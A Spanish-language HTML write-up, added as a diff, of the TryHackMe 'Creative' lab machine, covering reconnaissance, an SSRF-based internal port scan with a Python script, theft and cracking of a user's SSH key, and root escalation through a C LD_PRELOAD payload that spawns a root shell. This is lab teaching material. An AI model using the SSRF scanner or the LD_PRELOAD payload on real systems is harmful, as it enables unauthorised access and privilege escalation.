@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="es">
+   <head>
+      <meta charset="UTF-8">
+      <link rel="stylesheet" href=../css/general.css>
+      <title>Creative</title>
+      <style>
+			.obviarContent{
+				display: inline-block;
+				text-align: left;
+				white-space: pre;
+			}
+      </style>
+   </head>
+   <body>
+   	<h2>Creative</h2>
+   	<div>
+			<div>
+				<img src="../imagenes/Creative/creative.png" alt="Creative">
+			</div>
+
+			<section>
+				<nav>
+					<p>
+						La máquina "Creative" se encuentra en TryHackMe y tiene una dificultad fácil. Además, cuenta con un dominio que debemos considerar en nuestra máquina para ver los servicios que se ejecutan en el dispositivo remoto. También utiliza LD_PRELOAD, el cual se emplea en el escalamiento de privilegios. Esto permite utilizar variables de entorno y modificar el comportamiento de ciertos programas en la máquina.
+					</p>
+					<p>
+						 Para comenzar, es necesario encender la maquina en la plataforma TryHakme y tener el archivo *.openvpn en nuestro dispositivo 
+					</p>
+				</nav>
+				<div>
+					<nav>
+						<p>
+							Para empezar realizamos un escaneo con nmap a los 65535 puertos, para verificas si se tiene alguno de estos abiertos, asimismo se ha hecho la recopilaciòn de la version de estos y se ha lanzado scripts, teniendo como formato de salida la siguiente captura
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/scan1.png" alt="Reconocimeitno con nmap">
+					 <nav>
+                  <p>    
+                  	Con lo cual se verifica que se tiene 2 puertos abiertos, uno que es el ssh y otro que corresponde a una web, por lo cual pasamos a examinar la web, que deberia estar en el puerto 80 con whatweb y tengo, que esta se redirige a un dominio especifico, por lo cual se tiene que apuntar hacia ese punto en nuestra màquina tambièn
+                  </p>
+               </nav>
+               <img src="../imagenes/Creative/scanweb.png" alt="Whatweb">
+               <nav>
+						<p>
+							En el archivo <i>/etc/hosts</i> de nuestra màquina ponemos la IP de la màquina remota y el dominio que nos esta indicando <b>whatweb</b>
+						</p>
+               </nav>
+               <img src="../imagenes/Creative/etchost.png" alt="Dominio">
+					<nav>
+						<p>
+							Teniendo asì una web al abrir esta IP con el puerto 80 en mi navegador 
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/web.png" alt="Contenido web">
+					<nav>
+						<p>
+							Ahora al escanear con ffuf en subdominos tengo
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/ffuf.png" alt="Escaneo con ffuf">
+					<nav>
+						<p>
+							para interactuar con este nuevo subdominio es necesario volverlo a agregar en nel <i>/etc/hosts</i>
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/beta.png" alt="agregando a hosts">
+					<nav>
+						<p>
+							llegando de esta manera a una nueva pàgina, la cual acepta subidas de URLs 
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/webbeta.png" alt="pàgina beta">
+					<nav>
+						<p>
+							Al poner <i>http://localhost:80</i> nos devuelve el contenido que nos muestra actualmente en la web, lo cual indica que tiene ese puerto abierto reconocido desde la propia màquina lo cual resulta interesante ya que podria tener màs puertos que puedan ser vistos desde la misma màquina, ademàs al probar con otros puertos aleatorios nos sale como *dead* y no muestra nada màs 
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/port80.png" alt="web interna">
+					<nav>
+						<p>
+							Motivo por el que es necesario probar de manera consecutiva el envìo de puertos, si en caso haya alguno abiertos, por lo cual me he visto en la necesidad de crear un script con ayuda de ChatGPT para que simule el envio de puertos desde el 1 al 65535 y asi ir verificando cual o cuales estàn abiertos y cual me podria brindar contenido valioso o acceso a la màquina
+						</p>
+						<p>
+							Es importante destacar que en el script de python se esta identificando el <b>id</b> del input que recibe el contenido, ademàs se esta procesado las respuestas de acuerdo a la longitud de las mismas ya que cuando trato de interactuar con <i>http://localhost{port}</i> haye algunos que solo me muestran <b><i>dead</i></b> y en el contenido sale como una respuesta de 13 digitos, el script trata de omitir ello y solo reporta el contenido que tiene un nùmero diferente a ello, teniendo a continucaciòn el script como el resultado del mismo
+						</p>
+					</nav>
+					<div class="obviarContent">
+                  <pre style="font-family: monospace; white-space: pre; background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; overflow-x: auto;">
+import requests
+from bs4 import BeautifulSoup
+import concurrent.futures
+import sys
+
+def send_request_and_count_characters(session, url, port):
+    try:
+        # Realizar la solicitud GET a la URL
+        response = session.get(url)
+        response.raise_for_status()  # Verificar si hubo errores en la solicitud
+
+        # Obtener el contenido HTML de la respuesta
+        html_content = response.text
+
+        # Crear un objeto BeautifulSoup para parsear el HTML
+        soup = BeautifulSoup(html_content, 'html.parser')
+
+        # Modificar el valor del input con id="url" al puerto especificado
+        url_input = soup.find('input', id='url')
+        if url_input:
+            url_input['value'] = f"http://localhost:{port}"
+
+            # Obtener la URL del formulario de acción
+            form_action = soup.find('form')['action']
+            submit_url = url + form_action if form_action else url
+
+            # Enviar la solicitud POST con el valor modificado
+            post_data = {url_input['name']: url_input['value']}
+            post_response = session.post(submit_url, data=post_data)
+
+            # Verificar si la solicitud POST fue exitosa
+            post_response.raise_for_status()
+
+            # Obtener el contenido de la respuesta POST
+            post_html_content = post_response.text
+
+            # Calcular el número de caracteres en la respuesta POST
+            num_characters = len(post_html_content)
+
+            return port, num_characters
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error al hacer la solicitud a {url} con puerto {port}: {e}")
+        return port, None
+
+def main():
+    url = input("Ingrese la URL: ")
+    ports_to_test = range(1, 65535)  # Puertos del 1 al 65535
+
+    # Usar una sesión de Requests para mantener las conexiones abiertas
+    with requests.Session() as session:
+        # List comprehension para mapear los resultados de cada puerto
+        futures = []
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+            for port in ports_to_test:
+                futures.append(executor.submit(send_request_and_count_characters, session, url, port))
+
+            # Mostrar un mensaje de carga mientras se procesan las solicitudes
+            loading_symbols = ['|', '/', '-', '\\']
+            symbol_index = 0
+
+            for future in concurrent.futures.as_completed(futures):
+                sys.stdout.write(f"\rProbando puerto {future.result()[0]} {loading_symbols[symbol_index % len(loading_symbols)]}")
+                sys.stdout.flush()
+                symbol_index += 1
+
+                try:
+                    result = future.result()
+                    if result is not None:
+                        port, num_characters = result
+                        if num_characters is not None and num_characters != 13:
+                            print(f"\nNúmero de caracteres en la respuesta POST para puerto {port}: {num_characters}")
+                except Exception as e:
+                    print(f"Excepción al procesar puerto {port}: {e}")
+
+    print("\nPruebas completadas.")
+
+if __name__ == "__main__":
+    main()						
+						</pre>
+					</div>
+					<img src="../imagenes/Creative/scriptPort.png" alt="script ports">
+					<nav>
+						<p>
+							Verificando asi, que se tiene otro puerto abierto, el cual es el 1337, al revisar en este se tiene una serie de carpetas base que representan la base de la màquina
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/contentInter.png" alt="content inter">
+					<nav>
+						<p>
+							Sin embargo al tratar de acceder de manera manual dando click, esto no esta permitido en la màquina, lo cual entonces requiere que se pase toda la estructura de la direcciòn y màs hacia donde queremos dirigirnos, siendo asi que al ir probando con la url del puerto base y seguido de ciertos parametros para llegar al home del usuario se tiene que haye un usuario llamado saad y este asimismo tiene llaves ssh a las cuales vamos a apuntar ya que si bien recordando al inicio otro puerto abierto es el 22 para conecciones ssh
+						</p>
+						<p>
+							Llegando asi a obtener la llave ssh del usuario saad 
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/ssh_key.png" alt="ssh_key">
+					<nav>
+						<p>
+							Copiamos el contenido en un recurso de nuestra maquina, ademàs que le damos permiso <b>600</b> para que sea de escritura y lectura solo para el usuario 
+						</p>
+						<p>
+							Sin embargo a pesar de tener la clave privada e intentar realizar la conecciòn ssh a <i>saad@creative.html</i>, esta nos sigue pidiendo contraseña de acceso, lo cual nos hace pensar que se trata de una ssh con contraseña, para ello al ser de tipo <b>rsa</b> tengo un script en github para forzar esta y lograr obtener la credencial <a style="text-decoration:none; color:blue " href="https://github.com/JCarlosQM/forcing_ssh.git" target="_blank" >Carlos</a>
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/ssh_pass.png" alt="pass ssh">
+					<nav>
+						<p>
+							Logrando asi tener la credencial para acceder a la màquina mediante ssh
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/conectassh.png" alt="Conecciòn ssh">
+					<nav>
+						<p>
+							Estando en este punto lo primero es hacer un listado, encontrando aqui la primera flag 
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/flag1.png" alt="flag 1">
+					<nav>
+						<p>
+							Luego de revisar permisos SUID y màs no se ha llegado a mucho, por lo cual he listado de manera màs detallada esta direcciòn base a pesar que haye varios archivos y los he ido revisando he encontrado el de <b>.bash_history</b> con una credencial
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/listado.png" alt="listado detallado"> <br>
+					<img src="../imagenes/Creative/reviewhis.png" alt="revisiòn de history">	
+					<nav>
+						<p>
+							Al parecer la contraseña del usuario saad ha sido modificada y esto se ha quedado en el historial, por lo cual al hacer <b>sudo -l</b> puedo ver los procesos permisos que el usuario tiene como sudo, teniendose asi 
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/ldpre.png" alt="contenido de sudo">
+					<nav>
+						<p>
+							Al revisar la imagen se verifica que <i>/usr/bin/ping</i> corre como root y en la parte superior se tiene LD_PRELOAD, la cual es una variable de entorno en sistemas operativos basados en Unix (como Linux) que permite a los usuarios especificar una lista de bibliotecas compartidas que se cargarán antes que todas las demás bibliotecas al ejecutar un programa, por lo que bùscando en la web he encontrado que mediante un pequeño script en C se puede vulnerar esta variable de entorno y correr procesos como tal 
+						</p>
+					</nav>
+					<div class="obviarContent">
+						<pre style="font-family: monospace; white-space: pre; background-color: #f5f5f5; border: 1px solid #ccc; padding: 10px; overflow-x: auto;"> 
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    
+    setuid(0);
+    system("/bin/bash");
+}
+						</pre>
+					</div>
+					<nav>
+						<p>
+							Posterior a copiar este contenido en un archivo y guardarlo, de preferencia en <i>/tmp</i> he realizado lo siguiente, <i>el nombre del archivo es <b>test.c*</b></i> 
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/escalamiento.png" alt="Escalamiento">
+					<nav>
+						<p>
+							Verificando asi que he llegado a acceder como root tal cual se vee en la imagen anterior, ya en este punto solo queda buscar la flag en la carpeta de root
+						</p>
+					</nav>
+					<img src="../imagenes/Creative/flag2.png" alt="Flag 2">
+				</div>
+				
+			</section>
+					
+   	</div>
+   </body>
+   <hr>
+   <footer>
+      <div>
+         Jcarlos
+      </div>
+      <div>
+         <a href="https://rb.gy/d2u7jy" target="_blank" > Linkeding </a>
+      </div>
+   </footer>
+</html>
